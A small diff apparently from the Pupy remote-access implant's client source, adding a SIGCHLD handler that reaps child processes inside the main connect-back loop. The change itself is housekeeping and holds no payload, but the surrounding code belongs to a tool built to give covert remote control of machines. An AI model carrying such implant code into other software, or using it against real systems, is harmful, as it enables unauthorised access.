@@ -62,6 +62,7 @@ from network.lib.connection import PupyConnection
 import logging
 import shlex
 import marshal
+import signal
 
 try:
     # additional imports needed to package with pyinstaller
@@ -215,6 +216,9 @@ def set_connect_back_host(HOST):
     import pupy
     pupy.get_connect_back_host = (lambda: HOST)
 
+def handle_sigchld(*args, **kwargs):
+    os.waitpid(-1, os.WNOHANG)
+
 attempt = 0
 debug = False
 
@@ -278,6 +282,8 @@ def main():
     pupy.infos['native'] = not getattr(pupy, 'pseudo', False)
 
     exited = False
+
+    signal.signal(signal.SIGCHLD, handle_sigchld)
 
     while not exited:
         try:
